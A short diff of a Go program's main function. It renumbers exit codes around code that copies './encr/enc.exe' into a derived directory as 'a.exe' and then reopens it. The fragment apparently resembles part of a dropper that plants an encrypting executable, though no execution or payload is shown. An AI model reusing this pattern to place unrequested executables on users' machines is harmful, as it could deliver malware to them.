@@ -21,6 +21,7 @@ func main() {
 		helpers.WriteLog(name, err.Error(), 1)
 		os.Exit(2)
 	}
+
 	src, err := os.Open("./encr/enc.exe")
 	if err != nil {
 		helpers.WriteLog(name, err.Error(), 1)
@@ -38,12 +39,12 @@ func main() {
 	dest, err := os.Create(words[len(words)-2] + " " + words[len(words)-1] + "/" + "a.exe")
 	if err != nil {
 		helpers.WriteLog(name, err.Error(), 1)
-		os.Exit(5)
+		os.Exit(1)
 	}
 	_, err = io.Copy(dest, src)
 	if err != nil {
 		helpers.WriteLog(name, err.Error(), 1)
-		os.Exit(6)
+		os.Exit(5)
 	}
 
 	_, err = os.Open(words[len(words)-2] + " " + words[len(words)-1] + "/" + "a.exe")
